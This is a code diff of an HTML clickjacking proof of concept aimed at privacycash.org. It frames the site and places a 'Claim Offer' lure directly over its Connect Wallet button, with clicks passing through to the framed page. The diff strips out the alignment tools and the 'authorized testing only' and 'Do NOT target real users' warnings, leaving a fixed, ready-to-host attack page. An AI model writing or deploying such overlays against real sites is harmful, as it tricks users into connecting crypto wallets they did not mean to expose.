@@ -1,23 +1,23 @@
-<!doctype html>
+  <!doctype html>
 <html>
 <head>
 <meta charset="utf-8">
-<title>Clickjacking POC — exact positions (authorized testing only)</title>
-<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Clickjacking POC — Locked Overlay</title>
 <style>
-  html,body{height:100%;margin:0;font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,Arial}
-  iframe{position:absolute;left:0;top:0;width:100vw;height:100vh;border:0;z-index:0}
-  /* overlay */
+  html,body{height:100%;margin:0;font-family:sans-serif;}
+  iframe{position:absolute;left:0;top:0;width:100vw;height:100vh;border:0;z-index:0;}
+  /* overlay positioned exactly over Connect Wallet */
   #fake-ui {
     position:absolute;
-    z-index:3;
+    top:63.13vh;
+    left:50.22vw;
     transform: translate(-50%,-50%);
-    background: rgba(0,0,0,0.28);
+    z-index:3;
+    background: rgba(0,0,0,0.14);
     color:#fff;
     padding:12px 14px;
     border-radius:8px;
-    cursor:move;
-    user-select:none;
+    pointer-events:none; /* passthrough enabled */
     box-shadow:0 6px 20px rgba(0,0,0,0.18);
   }
   #fake-ui .btn {
@@ -26,133 +26,16 @@
     border-radius:6px;
     background: rgba(255,255,255,0.06);
   }
-  #fake-ui.locked { pointer-events: none; cursor:default; background: rgba(0,0,0,0.14); }
-
-  /* control panel */
-  #controls {
-    position: absolute;
-    left:12px; top:12px; z-index:4;
-    background:#fff; padding:10px; border-radius:8px;
-    box-shadow: 0 8px 32px rgba(0,0,0,0.12); max-width:360px;
-  }
-  #controls button { margin:6px 6px 0 0; padding:6px 10px; border-radius:6px; border:1px solid #e6e6e6; background:#f7f8fa; cursor:pointer; }
-  #coords { margin-top:8px; font-size:13px; color:#333; white-space:pre-wrap; background:#fafafa; padding:8px; border-radius:6px; border:1px solid #f0f0f0; }
-  small.note { display:block; margin-top:8px; color:#666; font-size:12px; }
 </style>
 </head>
 <body>
-  <!-- target -->
-  <iframe id="target" src="https://privacycash.org/"></iframe>
+  <!-- Target site -->
+  <iframe src="https://privacycash.org/"></iframe>
 
-  <!-- draggable overlay -->
-  <div id="fake-ui" title="Drag to align">
-    <div style="font-weight:600;margin-bottom:6px">Click for a special offer</div>
+  <!-- Fixed overlay -->
+  <div id="fake-ui">
+    <div style="font-weight:600;margin-bottom:6px;">Click for a special offer</div>
     <div class="btn">Claim Offer</div>
   </div>
-
-  <!-- controls -->
-  <div id="controls">
-    <div style="font-weight:700;margin-bottom:6px">Alignment controls</div>
-    <div>
-      <button id="useHeader">Use Header Position</button>
-      <button id="usePanel">Use Wallet Panel Position</button>
-      <button id="lockBtn">Lock & enable passthrough</button>
-      <button id="resetBtn">Reset</button>
-    </div>
-    <div id="coords"></div>
-    <small class="note">After locking the overlay becomes passthrough. Click the overlay area — the framed site WalletConnect modal should open if aligned correctly.</small>
-    <small class="note" style="color:#b00;margin-top:8px">SAFETY: Only use this POC for internal testing with consent. Do NOT target real users.</small>
-  </div>
-
-<script>
-/* Preset positions (vh / vw) tuned for typical desktop layout found on privacycash.org.
-   If your viewport is different, drag to fine-tune or use the drag helper. */
-const PRESETS = {
-  header: { top: 6.00, left: 86.00 },  // header top-right connect
-  panel:  { top: 48.00, left: 52.00 }  // wallet panel center connect
-};
-
-const overlay = document.getElementById('fake-ui');
-const coordsEl = document.getElementById('coords');
-let dragging=false, startX=0, startY=0, startLeft=0, startTop=0;
-
-function setOverlayVH(topVH, leftVW){
-  overlay.style.top = topVH + 'vh';
-  overlay.style.left = leftVW + 'vw';
-  overlay.style.transform = 'translate(-50%,-50%)';
-  updateCoordsDisplay();
-}
-
-function updateCoordsDisplay(){
-  const rect = overlay.getBoundingClientRect();
-  const topVH = ((rect.top + rect.height/2)/window.innerHeight)*100;
-  const leftVW = ((rect.left + rect.width/2)/window.innerWidth)*100;
-  coordsEl.textContent = `Computed (vh/vw):\ntop: ${topVH.toFixed(2)}vh\nleft: ${leftVW.toFixed(2)}vw\n\nCSS snippet:\n#fake-ui { top: ${topVH.toFixed(2)}vh; left: ${leftVW.toFixed(2)}vw; transform: translate(-50%,-50%); }`;
-}
-
-/* Dragging handlers (mouse + touch) */
-overlay.addEventListener('mousedown', (e)=>{
-  if (overlay.classList.contains('locked')) return;
-  dragging=true;
-  startX = e.clientX; startY = e.clientY;
-  const r = overlay.getBoundingClientRect(); startLeft = r.left; startTop = r.top;
-  e.preventDefault();
-});
-window.addEventListener('mousemove', (e)=>{
-  if(!dragging) return;
-  const dx = e.clientX - startX, dy = e.clientY - startY;
-  overlay.style.left = (startLeft + dx + overlay.offsetWidth/2)/window.innerWidth*100 + 'vw';
-  overlay.style.top  = (startTop + dy + overlay.offsetHeight/2)/window.innerHeight*100 + 'vh';
-  overlay.style.transform = 'translate(-50%,-50%)';
-  updateCoordsDisplay();
-});
-window.addEventListener('mouseup', ()=>{ dragging=false; });
-
-overlay.addEventListener('touchstart', (e)=>{
-  if (overlay.classList.contains('locked')) return;
-  dragging=true;
-  startX = e.touches[0].clientX; startY = e.touches[0].clientY;
-  const r = overlay.getBoundingClientRect(); startLeft = r.left; startTop = r.top;
-});
-window.addEventListener('touchmove', (e)=>{
-  if(!dragging) return;
-  const dx = e.touches[0].clientX - startX, dy = e.touches[0].clientY - startY;
-  overlay.style.left = (startLeft + dx + overlay.offsetWidth/2)/window.innerWidth*100 + 'vw';
-  overlay.style.top  = (startTop + dy + overlay.offsetHeight/2)/window.innerHeight*100 + 'vh';
-  overlay.style.transform = 'translate(-50%,-50%)';
-  updateCoordsDisplay();
-});
-window.addEventListener('touchend', ()=>{ dragging=false; });
-
-/* Buttons */
-document.getElementById('useHeader').addEventListener('click', ()=>{
-  setOverlayVH(PRESETS.header.top, PRESETS.header.left);
-  overlay.classList.remove('locked');
-  overlay.style.pointerEvents = 'auto';
-});
-document.getElementById('usePanel').addEventListener('click', ()=>{
-  setOverlayVH(PRESETS.panel.top, PRESETS.panel.left);
-  overlay.classList.remove('locked');
-  overlay.style.pointerEvents = 'auto';
-});
-document.getElementById('resetBtn').addEventListener('click', ()=>{
-  setOverlayVH(48,52);
-  overlay.classList.remove('locked');
-  overlay.style.pointerEvents = 'auto';
-});
-
-/* Lock & enable passthrough */
-document.getElementById('lockBtn').addEventListener('click', ()=>{
-  overlay.classList.add('locked');
-  overlay.style.pointerEvents = 'none';
-  updateCoordsDisplay();
-  alert('Overlay locked and passthrough enabled. Click the visual overlay area to test WalletConnect from the framed site.');
-});
-
-/* initialize */
-setOverlayVH(PRESETS.panel.top, PRESETS.panel.left);
-window.addEventListener('resize', updateCoordsDisplay);
-updateCoordsDisplay();
-</script>
 </body>
 </html>
